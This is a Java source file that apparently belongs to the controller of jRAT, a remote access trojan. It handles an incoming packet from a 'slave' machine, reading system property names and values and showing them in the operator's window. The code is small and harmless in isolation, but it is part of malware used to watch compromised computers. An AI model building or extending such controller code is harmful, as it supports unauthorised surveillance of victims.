package io.jrat.controller.packets.incoming;

import io.jrat.controller.Slave;
import io.jrat.controller.ui.frames.FrameSystemVariables;

import java.io.DataInputStream;


public class Packet32SystemProperties extends AbstractIncomingPacket {

	public void read(Slave slave, DataInputStream dis) throws Exception {
		FrameSystemVariables frame = FrameSystemVariables.INSTANCES.get(slave);
		String key = slave.readLine();
		String value = slave.readLine();
		
		if (frame != null) {
			frame.add(key, value);
		}
	}

}
